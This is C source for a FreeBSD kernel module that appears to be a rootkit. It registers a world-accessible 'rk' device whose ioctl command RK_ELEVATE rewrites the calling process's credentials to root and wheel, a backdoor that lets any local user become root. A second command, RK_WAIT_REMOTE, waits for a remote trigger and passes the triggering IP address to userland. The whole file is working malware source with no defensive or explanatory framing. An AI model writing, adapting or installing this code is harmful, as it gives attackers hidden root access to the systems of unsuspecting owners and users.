#include <sys/param.h>
#include <sys/conf.h>
#include <sys/errno.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/proc.h>
#include <sys/resourcevar.h>
#include <sys/systm.h>
#include <sys/ucred.h>
#include <sys/condvar.h>
#include <netinet/in.h>

#include "interface.h"

static struct cdev *rk_dev;

/* Global synchronization primitives defined in module for remote trigger */
extern struct cv remote_cv;
extern struct mtx remote_mtx;
extern struct in_addr trigger_ip;
extern int trigger_flag;

static int
rk_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int flags, struct thread *td) {

    (void)dev;
    (void)data;
    (void)flags;
    int error = 0;
 
    switch (cmd) {
    case RK_ELEVATE: {
        struct proc *p = td->td_proc;
        struct ucred *user_cred;
        struct ucred *root_cred = crget();
        struct uidinfo *uip = uifind(UID_ROOT);
        gid_t root_gid = GID_WHEEL;

        PROC_LOCK(p);

        user_cred = crcopysafe(p, root_cred);

        change_ruid(root_cred, uip);
        change_svuid(root_cred, UID_ROOT);
        change_euid(root_cred, uip);
        
        change_rgid(root_cred, root_gid);
        change_svgid(root_cred, root_gid);
        crsetgroups(root_cred, 1, &root_gid);

        setsugid(p);

        proc_set_cred(p, root_cred);

        PROC_UNLOCK(p);

        uifree(uip);
        crfree(user_cred);
        break;
    }

    case RK_WAIT_REMOTE: {
        mtx_lock(&remote_mtx);
        while (!trigger_flag) {
            error = cv_wait_sig(&remote_cv, &remote_mtx);
            if (error != 0)
                break;
        }
        if (error == 0 && data != NULL) {
            *(struct in_addr *)data = trigger_ip;
            trigger_flag = 0;
        }
        mtx_unlock(&remote_mtx);
        break;
    }

    default:
        return (ENOTTY);
    }

    return (error);
}

static struct cdevsw rk_cdevsw = {
    .d_version = D_VERSION,
    .d_name    = "rk",
    .d_ioctl   = rk_ioctl
};

int make_rk_dev(void) {
    return make_dev_p(
        MAKEDEV_CHECKNAME | MAKEDEV_WAITOK,
        &rk_dev,
        &rk_cdevsw,
        NULL,
        UID_ROOT,
        GID_WHEEL,
        0666,
        "rk"
    );
}

void destroy_rk_dev(void) {
    if (rk_dev != NULL) {
        destroy_dev(rk_dev);
        rk_dev = NULL;
    }
}
